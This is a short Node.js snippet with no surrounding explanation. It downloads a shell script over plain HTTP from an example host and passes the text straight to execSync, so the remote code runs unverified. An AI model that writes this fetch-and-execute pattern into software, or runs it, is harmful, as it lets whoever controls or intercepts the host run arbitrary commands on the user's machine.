import fetch from "node-fetch";
import { execSync } from "child_process";

fetch('http://mydownload.example.org/myscript.sh')
  .then(res => res.text())
  .then(script => execSync(script));


